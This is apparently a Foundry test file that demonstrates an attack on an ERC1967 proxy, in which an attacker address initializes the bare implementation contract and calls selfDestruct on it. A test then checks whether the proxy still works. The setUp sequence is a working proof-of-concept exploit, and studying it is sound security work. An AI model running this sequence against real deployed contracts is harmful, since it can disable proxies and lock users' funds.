// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {ImplementationSelf} from "../src/ImplementationSelf.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract ImplementationSelfTest is Test {
    uint256 constant private_key = 666666;
    address account = vm.addr(private_key);
    ImplementationSelf implementationSelf;
    address public proxy;
    address attacker = vm.addr(123456);

    function setUp() public {
        implementationSelf = new ImplementationSelf();

        proxy = address(
            new ERC1967Proxy(
                address(implementationSelf),
                abi.encodeCall(
                    ImplementationSelf.initialize,
                    (address(1), account)
                )
            )
        );

        console.log("proxy.owner()", ImplementationSelf(proxy).owner());

        // TODO:attacker destructs the contract
        vm.startPrank(attacker);
        implementationSelf.initialize(address(3), attacker);
        implementationSelf.selfDestruct();
        vm.stopPrank();
    }

    function testProxyOwner_ImplContractDestroyed_ProxyCanNotCallImplContract() public view {
     
        ImplementationSelf(proxy).owner();
    }
}
